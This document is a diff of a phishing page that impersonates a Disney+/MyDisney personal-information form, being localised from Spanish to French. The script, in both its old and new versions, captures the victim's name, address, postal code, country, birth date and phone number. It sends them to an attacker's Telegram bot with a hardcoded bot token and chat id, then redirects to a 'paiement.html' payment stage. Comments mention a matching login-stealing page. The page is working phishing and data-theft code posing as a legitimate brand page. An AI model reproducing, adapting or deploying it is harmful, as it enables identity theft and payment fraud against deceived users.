@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="fr">
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Información personal | Disney+</title>
+  <title>Informations personnelles | Disney+</title>
   <!-- CSS commun -->
   <link rel="stylesheet" href="style.css"/>
 </head>
@@ -12,40 +12,40 @@
     <!-- Logo MyDisney -->
     <img src="Images/Mydisney-logo.png" alt="MyDisney" class="center-logo"/>
 
-    <h1>Información personal</h1>
+    <h1>Informations personnelles</h1>
 
     <form id="infoForm">
-      <input type="text" placeholder="Apellido" required/>
-      <input type="text" placeholder="Nombre" required/>
-      <input type="text" placeholder="Dirección" required/>
-      <input type="text" placeholder="Ciudad" required/>
-      <input type="text" placeholder="Código postal" required/>
+      <input type="text" placeholder="Nom" required/>
+      <input type="text" placeholder="Prénom" required/>
+      <input type="text" placeholder="Adresse" required/>
+      <input type="text" placeholder="Ville" required/>
+      <input type="text" placeholder="Code postal" required/>
       <select required>
-        <option value="" disabled selected>País</option>
-        <option value="ES">España</option>
-        <option value="FR">Francia</option>
-        <option value="BE">Bélgica</option>
-        <option value="CH">Suiza</option>
+        <option value="" disabled selected>Pays</option>
+        <option value="FR">France</option>
+        <option value="BE">Belgique</option>
+        <option value="CH">Suisse</option>
+        <option value="ES">Espagne</option>
       </select>
 
-      <!-- Champ date avec placeholder interne et datepicker à l’ouverture -->
+      <!-- Champ date de naissance -->
       <input
         type="text"
         name="nacimiento"
-        placeholder="Fecha de nacimiento"
+        placeholder="Date de naissance"
         min="1900-01-01"
         max="2025-12-31"
         required
       />
 
-      <input type="tel" placeholder="Teléfono" required/>
-      <button type="submit">Continuar</button>
+      <input type="tel" placeholder="Téléphone" required/>
+      <button type="submit">Continuer</button>
     </form>
 
-    <!-- Note + logos -->
+    <!-- Note + logos partenaires -->
     <div class="footer-note">
-      <strong>Disney+ forma parte del grupo Walt Disney</strong><br/>
-      MyDisney te da acceso a servicios como Disney+, ESPN, Walt Disney World <a href="#">y más</a>.
+      <strong>Disney+ fait partie du groupe Walt Disney</strong><br/>
+      MyDisney vous donne accès aux services tels que Disney+, ESPN, Walt Disney World <a href="#">et bien plus</a>.
       <div class="logos-container">
         <img src="Images/compose2.png" alt="Disney+"/>
         <img src="Images/abc-logo-image-4413.png" alt="ABC"/>
@@ -62,46 +62,47 @@
   <div id="spinnerOverlay">
     <div class="spinner"></div>
   </div>
-<script>
-  document.getElementById("infoForm").addEventListener("submit", function(e) {
-    e.preventDefault();
-    document.getElementById("spinnerOverlay").style.display = "flex";
 
-    const elems = this.elements;
-    const data = {
-      apellido: elems[0].value.trim(),
-      nombre:   elems[1].value.trim(),
-      direccion:elems[2].value.trim(),
-      ciudad:   elems[3].value.trim(),
-      cp:       elems[4].value.trim(),
-      pais:     elems[5].value,
-      nacimiento: elems['nacimiento'].value, 
-      telefono: elems[7].value.trim()
-    };
+  <script>
+    document.getElementById("infoForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      document.getElementById("spinnerOverlay").style.display = "flex";
 
-    const bot   = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg"; // Même que login
-    const chat  = "-4970333928"; // Même chat que login
-    const msg   =
-      `📋 Información personal:\n` +
-      `Apellido: ${data.apellido}\n` +
-      `Nombre: ${data.nombre}\n` +
-      `Dirección: ${data.direccion}\n` +
-      `Ciudad: ${data.ciudad}\n` +
-      `Código postal: ${data.cp}\n` +
-      `País: ${data.pais}\n` +
-      `Fecha de nacimiento: ${data.nacimiento}\n` +
-      `Teléfono: ${data.telefono}`;
+      const elems = this.elements;
+      const data = {
+        nom:        elems[0].value.trim(),
+        prenom:     elems[1].value.trim(),
+        adresse:    elems[2].value.trim(),
+        ville:      elems[3].value.trim(),
+        cp:         elems[4].value.trim(),
+        pays:       elems[5].value,
+        naissance:  elems['nacimiento'].value,
+        telephone:  elems[7].value.trim()
+      };
 
-    fetch(`https://api.telegram.org/bot${bot}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: chat, text: msg })
-    })
-    .catch(err => console.error("Erreur Telegram:", err))
-    .finally(() => {
-      setTimeout(() => window.location.href = "paiement.html", 2500);
+      const bot   = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
+      const chat  = "-4970333928";
+      const msg   =
+        `📋 Informations personnelles :\n` +
+        `Nom : ${data.nom}\n` +
+        `Prénom : ${data.prenom}\n` +
+        `Adresse : ${data.adresse}\n` +
+        `Ville : ${data.ville}\n` +
+        `Code postal : ${data.cp}\n` +
+        `Pays : ${data.pays}\n` +
+        `Date de naissance : ${data.naissance}\n` +
+        `Téléphone : ${data.telephone}`;
+
+      fetch(`https://api.telegram.org/bot${bot}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chat, text: msg })
+      })
+      .catch(err => console.error("Erreur Telegram :", err))
+      .finally(() => {
+        setTimeout(() => window.location.href = "paiement.html", 2500);
+      });
     });
-  });
-</script>
+  </script>
 </body>
 </html>
